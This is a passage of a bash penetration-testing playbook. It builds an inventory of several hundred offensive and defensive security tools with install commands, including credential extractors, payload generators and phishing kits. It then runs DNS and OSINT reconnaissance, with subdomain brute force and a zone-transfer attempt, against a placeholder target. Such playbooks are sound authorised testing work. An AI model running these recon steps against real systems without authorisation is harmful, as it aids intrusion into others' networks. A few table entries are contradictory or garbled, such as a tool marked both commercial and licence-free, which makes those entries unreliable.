apt install ncrack\nnessus	licensed installer — see vendor portal\nnetcat	apt install netcat-traditional\nnetexec	pipx install netexec\nnetsparker	licensed installer — see vendor portal\nnetworkminer	licensed installer — see vendor portal\nnewman	npm install -g newman\nnexpose	licensed installer — see vendor portal\nnikto	apt install nikto\nnipper	apt install nipper-ng\nnmap	apt install nmap\nnosqlmap	pipx install nosqlmap\nnpm_audit	bundled with npm\nnuclei	go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest\nobjection	pipx install objection\nonesixtyone	apt install onesixtyone\nopenscap	apt install libopenscap8\nopenssl	apt install openssl\nopenvas	apt install gvm\noscanner	apt install oscanner\nosquery	apt install osquery\nosrframework	pipx install osrframework\np0f	apt install p0f\npacu	pipx install pacu\npadbuster	apt install padbuster\nparamspider	pipx install paramspider\nparos	vendor download — Java GUI\npassware	licensed installer — see vendor portal\npatator	apt install patator\nphishing_frenzy	vendor download\npip_audit	pipx install pip-audit\npixiewps	apt install pixiewps\nplaso	apt install plaso\nplcscan	vendor download — Python\nplecost	vendor download\npostman	windows binary — see vendor page\npowerfuzzer	vendor download\npowersploit	vendor download (PowerShell)\nprocess_explorer	windows binary — see vendor page\nprocmon	windows binary — see vendor page\nprowler	pipx install prowler\nproxychains	apt install proxychains4\nproxystrike	vendor download\nqradar	licensed installer — see vendor portal\nqualysguard	licensed installer — see vendor portal\nreaver	apt install reaver\nrecon_ng	apt install recon-ng\nresponder	apt install responder\nretina	licensed installer — see vendor portal\nretire	npm install -g retire\nrpcclient	apt install samba-common-bin\nrtlsdr	apt install rtl-sdr\ns7scan	vendor download\nscoutsuite	pipx install scoutsuite\nseatbelt	vendor release\nsemgrep	pipx install semgrep\nset	apt install set\nsharphound	vendor release\nsharpup	vendor release\nshodan	pipx install shodan\nsidguesser	vendor download\nsigcheck	windows binary — see vendor page\nskipfish	apt install skipfish\nsleuthkit	apt install sleuthkit\nsmbclient	apt install smbclient\nsmbmap	pipx install smbmap\nsmtp_user_enum	apt install smtp-user-enum\nsmuggler	pipx install smuggler\nsnmp_check	apt install snmpcheck\nsnmpwalk	apt install snmp\nsnyk	npm install -g snyk\nsoapui	vendor download + yourtarget.com CLI\nsocat	apt install socat\nsonar_scanner	vendor download\nspiderfoot	apt install spiderfoot\nsplunk	licensed installer — see vendor portal\nspray	pipx install spray\nsqlmap	apt install sqlmap\nsqlninja	apt install sqlninja\nsqlsus	apt install sqlsus\nssh	apt install openssh-client\nssh_audit	pipx install ssh-audit\nsshuttle	apt install sshuttle\nssllabs_api	no install — third-party API\nsslscan	apt install sslscan\nsslsplit	apt install sslsplit\nsslstrip	apt install sslstrip\nsslyze	pipx install sslyze\nsstimap	pipx install sstimap\nstrings	apt install binutils\nsubjack	go install github.com/haccer/subjack@latest\nsublist3r	apt install sublist3r\nsuricata	apt install suricata\nswaks	apt install swaks\nsysmon	windows binary — see vendor page\ntcpdump	apt install tcpdump\ntestssl	apt install testssl.sh\ntftp	apt install tftp-hpa\nthc_ipv6	apt install thc-ipv6\ntheharvester	apt install theharvester\ntnscmd10g	vendor download\ntripwire	licensed installer — see vendor portal\ntrivy	apt install trivy\ntrufflehog	vendor release binary\ntshark	apt install tshark\nuniscan	apt install uniscan\nunix_privesc_check	vendor download\nveracode	licensed installer — see vendor portal\nvolatility	pipx install volatility3\nw3af	apt install w3af\nwafw00f	apt install wafw00f\nwapiti	apt install wapiti\nwebinspect	licensed installer — see vendor portal\nwebscarab	vendor download — Java GUI\nwfuzz	apt install wfuzz\nwhatweb	apt install whatweb\nwhois	apt install whois\nwifiphisher	apt install wifiphisher\nwifite	apt install wifite\nwindapsearch	vendor download\nwindows_enabler	windows binary — see vendor page\nwinhex	licensed installer — see vendor portal\nwinpeas	vendor release\nwireshark	apt install wireshark\nwpscan	apt install wpscan\nx64dbg	vendor download — Windows\nxplico	vendor download\nxsser	apt install xsser\nxsstrike	apt install xsstrike\nyara	apt install yara\nyersinia	apt install yersinia\nzaproxy	apt install zaproxy\nzeek	apt install zeek\n' > ~/BugX/thuringerbank/01_recon/toolcheck.tsv; printf '%-16s %s\n' TOOL INSTALL; while IFS=$'\t' read -r tool install; do command -v "$tool" >/dev/null 2>&1 || printf '%-16s %s\n' "$tool" "$install"; done < ~/BugX/thuringerbank/01_recon/toolcheck.tsv | tee ~/BugX/thuringerbank/01_recon/toolcheck_missing.txt ; } 2>&1 | tee -a "$LOG"
fi

# 55. Write the tool-coverage sheet for the report  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '55. Write the tool-coverage sheet for the report'
else
  { cat > ~/BugX/thuringerbank/05_reports/tool_coverage.md <<'EOF'
# BugStrike tool coverage

Capability list derived from the CERT-In empanelled auditing-organisation snapshots, mapped to the
command families this playbook generates. Commercial entries are listed with the workflow they cover;
open-source entries are the ones a generated command actually calls.

| Tool | Family | Licence | Purpose | Install / access |
| --- | --- | --- | --- | --- |
| acunetix | web | commercial | licensed appliance | licensed installer — see vendor portal |
| adb | mobile | open | Android device bridge | apt install adb |
| aircrack_ng | wireless | open | 802.11 capture, injection and key recovery | apt install aircrack-ng |
| amass | recon | open | passive and active host enumeration | apt install amass |
| androguard | mobile | open | APK static analysis | pipx install androguard |
| android_studio | mobile | open | Android build and analysis IDE | vendor download |
| apkanalyzer | mobile | open | APK manifest and resource analysis | Android SDK build-tools |
| apkleaks | mobile | open | secret discovery in APKs | pipx install apkleaks |
| apksigner | mobile | open | APK signature verification | Android SDK build-tools |
| apktool | mobile | open | APK decoding and rebuilding | apt install apktool |
| appscan | web | commercial | licensed installer + AppScanCMD | licensed installer — see vendor portal |
| appscan_source | source | commercial | licensed installer | licensed installer — see vendor portal |
| arachni | web | open | automated application scanning framework | apt install arachni |
| arcsight | governance | commercial | licensed SIEM | licensed installer — see vendor portal |
| arjun | web | open | hidden parameter discovery | pipx install arjun |
| armitage | exploit | open | Metasploit GUI for team operations | apt install armitage |
| arp_scan | network | open | layer-2 discovery on the local segment | apt install arp-scan |
| asleap | wireless | open | LEAP and MS-CHAPv2 analysis | apt install asleap |
| auditd | governance | open | Linux audit rules | apt install auditd |
| automat | recon | open | IP, domain and hash reputation lookups | apt install automat |
| autopsy | forensics | open | disk and timeline forensics | apt install autopsy |
| awscli | cloud | open | AWS enumeration | pipx install awscli |
| axmlprinter2 | mobile | open | binary manifest to XML | vendor download |
| az | cloud | open | Azure enumeration | vendor install script |
| azurehound | cloud | open | Azure attack-path collection | vendor release |
| bacnet_scan | ics | open | BACnet device discovery | vendor download |
| bandit | source | open | Python security linting | pipx install bandit |
| bash | setup | open | workspace, session variables and report scaffolding | built in |
| bbqsql | injection | open | blind SQL injection framework | pipx install bbqsql |
| beef | web | open | browser exploitation framework for XSS demonstrations | apt install beef-xss |
| bing_ip2hosts | recon | open | reverse host lookup from search results | apt install bing-ip2hosts |
| blindelephant | web | open | web app version fingerprinting | apt install blindelephant |
| bloodhound | windows | open | attack-path graphing | apt install bloodhound |
| bluelog | wireless | open | Bluetooth discovery | apt install bluelog |
| bluemaho | wireless | open | Bluetooth testing framework | vendor download |
| bluepot | wireless | open | Bluetooth honeypot | vendor download |
| bluesnarfer | wireless | open | Bluetooth object access testing | apt install bluesnarfer |
| braa | devices | open | fast SNMP scanning | apt install braa |
| brutespray | credentials | open | service-aware credential testing from scan output | apt install brutespray |
| brutus | credentials | freeware | legacy Windows brute-force utility | windows binary — see vendor page |
| bulk_extractor | forensics | open | feature extraction from images | apt install bulk-extractor |
| bully | wireless | open | WPS brute force | apt install bully |
| burp | web | commercial | licensed installer — Burp Community is free | licensed installer — see vendor portal |
| cain_abel | credentials | freeware | legacy Windows password recovery suite | windows binary — see vendor page |
| cewl | credentials | open | site-specific wordlist generation | apt install cewl |
| checklist | governance | open | control-evidence checklist for the framework being reported | built in |
| checkmarx | source | commercial | licensed platform (CxConsole) | licensed installer — see vendor portal |
| checkov | cloud | open | infrastructure-as-code scanning | pipx install checkov |
| chisel | windows | open | TCP tunnelling over HTTP | vendor release binary |
| cis_cat | governance | commercial | CIS licensed tool | licensed installer — see vendor portal |
| cisco_auditing_tool | devices | open | Cisco configuration audit | apt install cisco-auditing-tool |
| cisco_global_exploiter | devices | open | Cisco vulnerability checks | apt install cisco-global-exploiter |
| cisco_ocs | devices | open | Cisco device discovery | apt install cisco-ocs |
| cisco_torch | devices | open | Cisco device scanning and fingerprinting | apt install cisco-torch |
| clairvoyance | web | open | schema recovery when introspection is off | pipx install clairvoyance |
| class_dump_z | mobile | open | iOS Objective-C interface dumping | vendor download |
| cloudfox | cloud | open | cloud situational awareness | vendor release binary |
| cmseek | web | open | CMS detection and enumeration | pipx install cmseek |
| commix | web | open | OS command injection testing | apt install commix |
| cookie_cadger | web | open | session sidejacking demonstration | vendor download — Java |
| copy_router_config | devices | open | router configuration retrieval test | apt install copy-router-config |
| core | setup | open | guided core-path steps BugStrike recommends for every engagement | built in |
| cowpatty | wireless | open | WPA-PSK dictionary attack | apt install cowpatty |
| crackle | wireless | open | BLE pairing cracking | apt install crackle |
| crackmapexec | exploit | open | Windows/AD authentication and execution | pipx install netexec |
| crtsh | recon | open | certificate transparency host harvest | curl — no install |
| crunch | credentials | open | wordlist generation | apt install crunch |
| csrftester | web | commercial | licence-free Java tool | licensed installer — see vendor portal |
| curl_docs | api | open | hand-written requests that prove a finding | apt install curl |
| cycript | mobile | open | iOS runtime analysis | vendor download |
| dalfox | web | open | XSS parameter analysis | go install github.com/hahwul/dalfox/v2@latest |
| dbpwaudit | injection | open | database password auditing | vendor download |
| dependency_check | source | open | OWASP dependency-check | vendor release |
| dex2jar | mobile | open | DEX to JAR conversion | apt install dex2jar |
| dig_dmarc | social | open | SPF, DKIM and DMARC review | apt install dnsutils |
| dirb | web | open | dictionary-based content discovery | apt install dirb |
| dirbuster | web | open | GUI content discovery | apt install dirbuster |
| dnmap | network | open | distributed nmap across client nodes | apt install dnmap |
| dnsenum | recon | open | zone transfer attempts and record harvesting | apt install dnsenum |
| dnsmap | recon | open | subdomain brute force | apt install dnsmap |
| dnspy | client | open | .NET debugger and decompiler | vendor download — Windows |
| dnsrecon | recon | open | zone, record and brute-force enumeration | apt install dnsrecon |
| dnstracer | recon | open | authoritative resolution path tracing | apt install dnstracer |
| dnswalk | recon | open | zone file validation and transfer check | apt install dnswalk |
| dnsx | recon | open | bulk resolution | go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest |
| docker_bench | cloud | open | Docker CIS benchmark | vendor download |
| doona | wireless | open | access point fuzzing | apt install doona |
| dotdotpwn | web | open | path traversal and LFI testing | apt install dotdotpwn |
| droopescan | web | open | CMS plugin and version enumeration | pipx install droopescan |
| drozer | mobile | open | Android attack surface exploration | pipx install drozer |
| eapmd5pass | wireless | open | EAP-MD5 credential analysis | apt install eapmd5pass |
| echo_mirage | client | open | thick-client traffic interception | vendor download — Windows |
| enum4linux | windows | open | SMB, RPC and policy enumeration | apt install enum4linux |
| evilginx2 | social | open | reverse-proxy awareness testing | vendor release binary |
| exiftool | forensics | open | metadata extraction | apt install libimage-exiftool-perl |
| fern_wifi | wireless | open | wireless cracking GUI | vendor download — Python GUI |
| feroxbuster | web | open | recursive content discovery | apt install feroxbuster |
| ffuf | web | open | fast web fuzzing | go install github.com/ffuf/ffuf/v2@latest |
| fierce | recon | open | DNS recon and brute force | apt install fierce |
| fimap | web | open | LFI discovery and exploitation checks | apt install fimap |
| firewalk | network | open | gateway ACL and rule mapping | apt install firewalk |
| floss | client | open | string extraction from binaries | pipx install flare-floss |
| foremost | forensics | open | file carving | apt install foremost |
| fortify | source | commercial | licensed installer (sourceanalyzer) | licensed installer — see vendor portal |
| fping | network | open | CIDR liveness sweep | apt install fping |
| fport | network | freeware | Windows open-port to process mapping | windows binary — see vendor page |
| fragroute | network | open | fragmentation behaviour testing | apt install fragroute |
| fragrouter | network | open | fragment-based IDS/IPS evasion testing | apt install fragrouter |
| frida | mobile | open | dynamic instrumentation | pipx install frida-tools |
| gau | recon | open | historical URL collection | go install github.com/lc/gau/v2/cmd/gau@latest |
| gcloud | cloud | open | GCP enumeration | vendor install script |
| ghost_phisher | wireless | open | rogue AP and captive portal testing | vendor download — Python GUI |
| giskismet | wireless | open | Kismet output mapping | apt install giskismet |
| git | source | open | history and blame review | apt install git |
| gitleaks | source | open | secret detection in git history | vendor release binary |
| gobuster | web | open | content and vhost brute force | apt install gobuster |
| goofile | recon | open | public file discovery by type | apt install goofile |
| gophish | social | open | phishing simulation campaigns | vendor release binary |
| gr_scan | wireless | open | GNU Radio spectrum scanning | vendor download |
| grabber | web | open | web application scanner | vendor download — Python GUI |
| graphql_cop | web | open | GraphQL hardening checks | pipx install graphql-cop |
| grassmarlin | ics | open | OT network mapping | vendor download — Java GUI |
| h2csmuggler | web | open | HTTP/2 cleartext smuggling checks | vendor download |
| hashcat | credentials | open | GPU hash cracking | apt install hashcat |
| hashid | credentials | open | hash type identification | pipx install hashid |
| helix3 | forensics | commercial | licensed live CD | licensed installer — see vendor portal |
| hexorbase | injection | open | multi-database client and brute forcer | vendor download — Java |
| hostapd_wpe | wireless | open | enterprise wireless credential capture in an approved test | apt install hostapd-wpe |
| hping3 | network | open | packet crafting, firewall and protocol probes | apt install hping3 |
| httpx | recon | open | HTTP probing and fingerprinting | go install github.com/projectdiscovery/httpx/cmd/httpx@latest |
| hurl | web | open | HTTP header and request inspection | apt install hurl |
| hydra | credentials | open | online password testing across protocols | apt install hydra |
| ideviceinfo | mobile | open | iOS device information | apt install libimobiledevice-utils |
| ifunbox | mobile | freeware | iOS filesystem browser | windows binary — see vendor page |
| ilspy | client | open | .NET decompilation | vendor download — Windows |
| impacket | exploit | open | protocol scripts: secretsdump, psexec, relay | pipx install impacket |
| impacket_secretsdump | windows | open | credential material extraction | pipx install impacket |
| inspy | recon | open | public employee and role enumeration | apt install inspy |
| interactsh | exploit | open | out-of-band interaction server | go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest |
| ironwasp | web | open | application testing framework | vendor download — Python GUI |
| isf | ics | open | Industrial Exploitation Framework | vendor download — Python |
| jadx | mobile | open | DEX to Java decompilation | apt install jadx |
| jboss_autopwn | exploit | open | JBoss exploitation checks | vendor download |
| jd_cli | mobile | open | Java decompiler CLI | vendor download |
| john | credentials | open | offline hash cracking | apt install john |
| joomscan | web | open | Joomla enumeration | apt install joomscan |
| jsql | injection | open | database injection testing | vendor download — Java |
| jwt_tool | web | open | JWT weakness testing | apt install jwt-tool |
| kalibrate | wireless | open | GSM base station survey | apt install kalibrate-rtl |
| katana | web | open | crawler | go install github.com/projectdiscovery/katana/cmd/katana@latest |
| kerbrute | credentials | open | Kerberos user enumeration and spraying | vendor release binary |
| killerbee | wireless | open | ZigBee and 802.15.4 testing | pipx install killerbee |
| king_phisher | social | open | phishing simulation | apt install king-phisher |
| kismet | wireless | open | wireless detector and sniffer | apt install kismet |
| kiterunner | web | open | API route brute force with real wordlists | vendor release binary |
| kube_hunter | cloud | open | Kubernetes exposure discovery | pipx install kube-hunter |
| kubeaudit | cloud | open | Kubernetes configuration audit | vendor release binary |
| kubectl | cloud | open | Kubernetes enumeration | vendor binary |
| kubesec | cloud | open | manifest risk scoring | vendor release binary |
| ldapsearch | windows | open | directory enumeration | apt install ldap-utils |
| les | windows | open | Linux Exploit Suggester | vendor download |
| ligolo_ng | windows | open | reverse tunnelling and pivoting | vendor release binary |
| linpeas | windows | open | Linux privilege-escalation enumeration | vendor release |
| log4j_scan | injection | open | Log4Shell checks | pipx install log4j-scan |
| lucy | social | commercial | licensed appliance | licensed installer — see vendor portal |
| lynis | governance | open | host security and hardening audit | apt install lynis |
| maltego | recon | commercial | licensed client — community edition available | licensed installer — see vendor portal |
| masscan | network | open | very fast full-range port sweep | apt install masscan |
| mbtget | ics | open | Modbus register reading | vendor download |
| mdk3 | wireless | open | 802.11 stress and deauth testing (authorized only) | apt install mdk3 |
| medusa | credentials | open | parallel online password testing | apt install medusa |
| metagoofil | recon | open | public document metadata harvesting | apt install metagoofil |
| metasploit | exploit | open | exploitation and auxiliary modules | apt install metasploit-framework |
| meterpreter | exploit | open | post-exploitation session | bundled with metasploit-framework |
| mimikatz | windows | open | credential extraction (engagement authorization required) | vendor release |
| mitmproxy | web | open | scriptable interception for web, mobile and thick clients | apt install mitmproxy |
| mobsf | mobile | open | static and dynamic mobile analysis | docker pull opensecurity/mobile-security-framework-mobsf |
| modbus_cli | ics | open | Modbus interrogation | pipx install modbus-cli |
| msfvenom | exploit | open | payload generation | bundled with metasploit-framework |
| multimon_ng | wireless | open | pager and digital radio decoding | apt install multimon-ng |
| nagios | governance | open | monitoring and availability review | apt install nagios4 |
| nbtscan | windows | open | NetBIOS name survey | apt install nbtscan |
| ncrack | credentials | open | network authentication cracking | apt install ncrack |
| nessus | governance | commercial | licensed appliance (nessuscli) | licensed installer — see vendor portal |
| netcat | network | open | banner grab, listeners and file transfer | apt install netcat-traditional |
| netexec | exploit | open | successor to CrackMapExec | pipx install netexec |
| netsparker | web | commercial | licensed appliance (Invicti) | licensed installer — see vendor portal |
| netstumbler | wireless | freeware | legacy Windows wireless detector | windows binary — see vendor page |
| networkminer | forensics | commercial | vendor download — Windows | licensed installer — see vendor portal |
| newman | web | open | Postman collection runner | npm install -g newman |
| nexpose | governance | commercial | licensed appliance | licensed installer — see vendor portal |
| nikto | web | open | server and CGI misconfiguration scanner | apt install nikto |
| nipper | devices | open | network device configuration review | apt install nipper-ng |
| nmap | network | open | port, service and NSE script scanning | apt install nmap |
| nosqlmap | injection | open | NoSQL injection testing | pipx install nosqlmap |
| npm_audit | source | open | dependency advisories | bundled with npm |
| nuclei | web | open | template-driven checks | go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest |
| nuclei_mobile | mobile | open | MobSF / mobile template checks | vendor release |
| objection | mobile | open | runtime mobile exploration | pipx install objection |
| ollydbg | client | freeware | legacy Windows debugger | windows binary — see vendor page |
| onesixtyone | devices | open | SNMP community string testing | apt install onesixtyone |
| openscap | governance | open | SCAP compliance evaluation | apt install libopenscap8 |
| openssl | tls | open | protocol, cipher and certificate probing | apt install openssl |
| openvas | governance | open | open vulnerability scanning | apt install gvm |
| oscanner | injection | open | Oracle instance enumeration | apt install oscanner |
| osquery | governance | open | host state and audit queries | apt install osquery |
| osrframework | recon | open | username, domain and phone footprinting | pipx install osrframework |
| oxygen_forensic | forensics | commercial | licensed installer | licensed installer — see vendor portal |
| p0f | network | open | passive OS fingerprinting | apt install p0f |
| pacu | cloud | open | AWS exploitation framework (authorized) | pipx install pacu |
| padbuster | web | open | padding-oracle and CBC abuse testing | apt install padbuster |
| paramspider | web | open | parameter mining from archives | pipx install paramspider |
| paros | web | open | legacy intercepting proxy | vendor download — Java GUI |
| passware | credentials | commercial | licensed installer | licensed installer — see vendor portal |
| patator | credentials | open | modular brute force | apt install patator |
| phishing_frenzy | social | open | templated phishing simulation | vendor download |
| pip_audit | source | open | Python dependency advisories | pipx install pip-audit |
| pixiewps | wireless | open | offline WPS PIN recovery | apt install pixiewps |
| plaso | forensics | open | super-timeline generation | apt install plaso |
| plcscan | ics | open | PLC discovery and identification | vendor download — Python |
| plecost | web | open | WordPress scanner | vendor download |
| postman | web | freeware | GUI API client | windows binary — see vendor page |
| powerfuzzer | web | open | heuristic fuzzer | vendor download |
| powersploit | exploit | open | post-exploitation PowerShell modules | vendor download (PowerShell) |
| process_explorer | client | freeware | Sysinternals Suite | windows binary — see vendor page |
| procmon | client | freeware | Sysinternals Suite | windows binary — see vendor page |
| prodiscocer | forensics | commercial | licensed installer | licensed installer — see vendor portal |
| prowler | cloud | open | multi-cloud security assessment | pipx install prowler |
| proxychains | windows | open | routing tools through a pivot | apt install proxychains4 |
| proxystrike | web | open | HTTP proxy with attack modules | vendor download |
| psexec | windows | open | remote execution | pipx install impacket |
| pyrit | wireless | open | WPA-PSK compute benchmarking | apt install pyrit |
| qradar | governance | commercial | licensed SIEM | licensed installer — see vendor portal |
| qualysguard | governance | commercial | licensed platform + API | licensed installer — see vendor portal |
| reaver | wireless | open | WPS PIN testing | apt install reaver |
| recon_ng | recon | open | modular OSINT framework | apt install recon-ng |
| responder | exploit | open | LLMNR/NBT-NS/mDNS poisoning on an authorized segment | apt install responder |
| retina | governance | commercial | licensed installer | licensed installer — see vendor portal |
| retire | source | open | vulnerable JavaScript library detection | npm install -g retire |
| routersploit | exploit | open | embedded device exploitation | pipx install routersploit |
| rpcclient | windows | open | RPC enumeration | apt install samba-common-bin |
| rtlsdr | wireless | open | software-defined radio capture | apt install rtl-sdr |
| s7scan | ics | open | Siemens S7 discovery | vendor download |
| scoutsuite | cloud | open | cloud configuration review | pipx install scoutsuite |
| searchsploit | exploit | open | local Exploit-DB search | apt install exploitdb |
| seatbelt | windows | open | host situational awareness | vendor release |
| semgrep | source | open | pattern-based static analysis | pipx install semgrep |
| set | social | open | Social-Engineer Toolkit campaigns | apt install set |
| sfuzz | web | open | simple protocol fuzzer | apt install sfuzz |
| sharphound | windows | open | BloodHound collector for Windows | vendor release |
| sharpup | windows | open | Windows privilege-escalation audit | vendor release |
| shodan | recon | open | internet-exposure search (API key required) | pipx install shodan |
| sidguesser | injection | open | Oracle SID discovery | vendor download |
| sigcheck | client | freeware | Sysinternals Suite | windows binary — see vendor page |
| skipfish | web | open | automated application crawl and scan | apt install skipfish |
| sleuthkit | forensics | open | filesystem forensic CLI | apt install sleuthkit |
| smbclient | windows | open | share listing and file access | apt install smbclient |
| smbmap | windows | open | share permission mapping | pipx install smbmap |
| smtp_user_enum | social | open | mailbox enumeration | apt install smtp-user-enum |
| smuggler | web | open | HTTP request smuggling detection | pipx install smuggler |
| snmp_check | ics | open | SNMP enumeration | apt install snmpcheck |
| snmpwalk | devices | open | SNMP tree enumeration | apt install snmp |
| snyk | source | open | dependency and container scanning | npm install -g snyk |
| soapui | web | open | SOAP and REST service testing | vendor download + yourtarget.com CLI |
| socat | windows | open | relays and tunnels | apt install socat |
| sonar_scanner | source | open | SonarQube analysis runner | vendor download |
| sonarqube | source | open | continuous code quality and security | docker pull sonarqube |
| spiderfoot | recon | open | automated OSINT correlation | apt install spiderfoot |
| splunk | governance | commercial | licensed SIEM | licensed installer — see vendor portal |
| spooftooph | wireless | open | Bluetooth device spoofing test | apt install spooftooph |
| spray | credentials | open | password spraying with lockout throttling | pipx install spray |
| sqlmap | injection | open | SQL injection detection and exploitation | apt install sqlmap |
| sqlninja | injection | open | SQL Server focused injection | apt install sqlninja |
| sqlsus | injection | open | MySQL injection tool | apt install sqlsus |
| ssh | windows | open | remote access and port forwarding | apt install openssh-client |
| ssh_audit | credentials | open | SSH configuration and algorithm review | pipx install ssh-audit |
| sshuttle | windows | open | transparent VPN over SSH | apt install sshuttle |
| ssllabs_api | tls | open | independent TLS grade for a public endpoint | no install — third-party API |
| sslscan | tls | open | cipher and protocol summary | apt install sslscan |
| sslsplit | web | open | TLS interception testing | apt install sslsplit |
| sslstrip | web | open | HTTPS downgrade testing on an authorized segment | apt install sslstrip |
| sslyze | tls | open | deep TLS scan with JSON output | pipx install sslyze |
| sstimap | injection | open | server-side template injection | pipx install sstimap |
| strings | client | open | raw string extraction | apt install binutils |
| subfinder | recon | open | passive subdomain discovery | go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest |
| subjack | recon | open | subdomain takeover fingerprints | go install github.com/haccer/subjack@latest |
| sublist3r | recon | open | multi-source subdomain enumeration | apt install sublist3r |
| superscan | network | freeware | Windows port scanner GUI | windows binary — see vendor page |
| suricata | governance | open | IDS rules and alerts | apt install suricata |
| swaks | social | open | SMTP and header testing | apt install swaks |
| sysmon | governance | freeware | Sysinternals Suite | windows binary — see vendor page |
| tcpdump | network | open | packet capture | apt install tcpdump |
| terrascan | cloud | open | IaC policy scanning | vendor release binary |
| testssl | tls | open | TLS configuration assessment | apt install testssl.sh |
| tftp | devices | open | configuration transfer test | apt install tftp-hpa |
| thc_ipv6 | network | open | IPv6 and ICMPv6 attack toolset | apt install thc-ipv6 |
| theharvester | recon | open | domains, emails and hosts from public sources | apt install theharvester |
| tnscmd10g | injection | open | Oracle TNS listener probing | vendor download |
| tplmap | injection | open | template injection testing | vendor download (superseded by SSTImap) |
| tripwire | governance | commercial | licensed/tripwire open source | licensed installer — see vendor portal |
| trivy | cloud | open | image, filesystem and config scanning | apt install trivy |
| trufflehog | source | open | verified secret detection | vendor release binary |
| tshark | forensics | open | command-line protocol analysis | apt install tshark |
| twofi | recon | open | wordlist generation from public posts (API key) | apt install twofi |
| uniscan | web | open | lightweight discovery and checks | apt install uniscan |
| unix_privesc_check | windows | open | Unix privilege-escalation enumeration | vendor download |
| vega | web | open | GUI scanner and proxy | vendor download — Java GUI |
| veracode | source | commercial | licensed API + CLI | licensed installer — see vendor portal |
| volatility | forensics | open | memory forensics | pipx install volatility3 |
| w3af | web | open | application attack and audit framework | apt install w3af |
| wafw00f | web | open | WAF detection | apt install wafw00f |
| wapiti | web | open | black-box application scanner | apt install wapiti |
| waybackurls | recon | open | Wayback URL collection | go install github.com/tomnomnom/waybackurls@latest |
| webinspect | web | commercial | licensed installer | licensed installer — see vendor portal |
| webscarab | web | open | legacy analysis proxy | vendor download — Java GUI |
| wfuzz | web | open | parameter and payload fuzzing | apt install wfuzz |
| whatweb | web | open | technology fingerprinting | apt install whatweb |
| whois | recon | open | registration and contact records | apt install whois |
| wifiphisher | wireless | open | awareness-testing access point | apt install wifiphisher |
| wifitap | wireless | open | wireless traffic injection testing | apt install wifitap |
| wifite | wireless | open | automated wireless auditing | apt install wifite |
| windapsearch | windows | open | AD enumeration over LDAP | vendor download |
| windows_enabler | client | freeware | enabling disabled UI controls during testing | windows binary — see vendor page |
| winhex | client | commercial | licensed installer | licensed installer — see vendor portal |
| winpeas | windows | open | Windows privilege-escalation checks | vendor release |
| wireshark | forensics | open | protocol analysis | apt install wireshark |
| wpscan | web | open | WordPress enumeration and checks | apt install wpscan |
| x64dbg | client | open | Windows debugger | vendor download — Windows |
| xplico | forensics | open | network forensic reconstruction | vendor download |
| xsser | web | open | XSS testing and encoding bypass | apt install xsser |
| xsstrike | web | open | context-aware XSS testing | apt install xsstrike |
| yara | forensics | open | pattern matching over artefacts | apt install yara |
| yersinia | network | open | layer-2 protocol attack testing | apt install yersinia |
| ysoserial | injection | open | deserialization gadget generation | vendor release jar |
| zaproxy | web | open | OWASP ZAP proxy, spider and active scan | apt install zaproxy |
| zeek | governance | open | network security monitoring | apt install zeek |
| zenmap | network | commercial | nmap GUI front end — ships with the nmap package | licensed installer — see vendor portal |
EOF
wc -l ~/BugX/thuringerbank/05_reports/tool_coverage.md ; } 2>&1 | tee -a "$LOG"
fi

# 56. Safety legend for the labels used in this playbook  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '56. Safety legend for the labels used in this playbook'
else
  { printf '%s\n' "local-only" "passive" "authorized-active" "authorized-active · loud" "opt-in heavy" "requires consent" | tee ~/BugX/thuringerbank/05_reports/safety_legend.txt ; } 2>&1 | tee -a "$LOG"
fi

# ---------------------------------------------------------------- OSINT, DNS & external recon
note '[OSINT, DNS & external recon] no requests to the target · brute-force entries send /usr/share/wordlists/dirb/common.txt lookups to the resolver'

# 57. Registration, registrar and contact records  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '57. Registration, registrar and contact records'
else
  { whois yourtarget.com | egrep -i 'registrar|name server|org|country|email|created|expires' | tee ~/BugX/thuringerbank/01_recon/whois.txt ; } 2>&1 | tee -a "$LOG"
fi

# 58. Subdomain enumeration from public sources  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '58. Subdomain enumeration from public sources'
else
  { sublist3r -d yourtarget.com -v -o ~/BugX/thuringerbank/01_recon/sublist3r.txt ; } 2>&1 | tee -a "$LOG"
fi

# 59. Amass passive enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '59. Amass passive enumeration'
else
  { amass enum -passive -d yourtarget.com -silent -o ~/BugX/thuringerbank/01_recon/amass_passive.txt ; } 2>&1 | tee -a "$LOG"
fi

# 60. Harvest hosts, emails and names from public sources  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '60. Harvest hosts, emails and names from public sources'
else
  { theHarvester -d yourtarget.com -b bing,duckduckgo,crtsh,otx -l 500 -f ~/BugX/thuringerbank/01_recon/harvester ; } 2>&1 | tee -a "$LOG"
fi

# 61. Fierce DNS recon and light brute force  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '61. Fierce DNS recon and light brute force'
else
  { fierce --domain yourtarget.com --subdomains ~/BugX/thuringerbank/01_recon/wordlist_fierce.txt 2>/dev/null | tee ~/BugX/thuringerbank/01_recon/fierce.txt ; } 2>&1 | tee -a "$LOG"
fi

# 62. Standard record enumeration  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '62. Standard record enumeration'
else
  { dnsrecon -d yourtarget.com -t std -j ~/BugX/thuringerbank/01_recon/dnsrecon.json ; } 2>&1 | tee -a "$LOG"
fi

# 63. DNS brute force from a wordlist  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '63. DNS brute force from a wordlist'
else
  { dnsrecon -d yourtarget.com -t brt -D /usr/share/wordlists/dirb/common.txt -j ~/BugX/thuringerbank/01_recon/dnsrecon_brt.json ; } 2>&1 | tee -a "$LOG"
fi

# 64. Zone transfer attempt plus record harvesting  (authorized-active)
if [ "$DRY_RUN" = "1" ]; then
  skip '64. Zone transfer attempt plus record harvesting'
else
  { dnsenum --enum yourtarget.com -f /usr/share/wordlists/dirb/common.txt -r -o ~/BugX/thuringerbank/01_recon/dnsenum.xml ; } 2>&1 | tee -a "$LOG"
fi

